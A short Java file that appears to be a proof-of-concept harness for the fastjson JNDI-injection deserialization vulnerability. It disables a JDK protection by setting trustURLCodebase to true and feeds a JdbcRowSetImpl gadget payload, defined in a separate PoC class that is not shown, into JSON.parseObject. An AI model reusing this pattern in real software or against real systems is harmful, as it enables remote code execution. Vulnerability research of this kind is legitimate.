package com.venscor;

import com.alibaba.fastjson.JSON;

/**
 * @ClassName VulDemo
 * @Description TODO
 * @Author wangyu89
 * @Create Time 2019-07-11 20:49
 * @Version 1.0
 */
public class VulDemo {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true"); // 高版本jdk对jdni注入有限制，jdk8u122及以上
        String payload = PoC.jdbcRowSetImplPayload45();
        JSON.parseObject(payload);
    }

}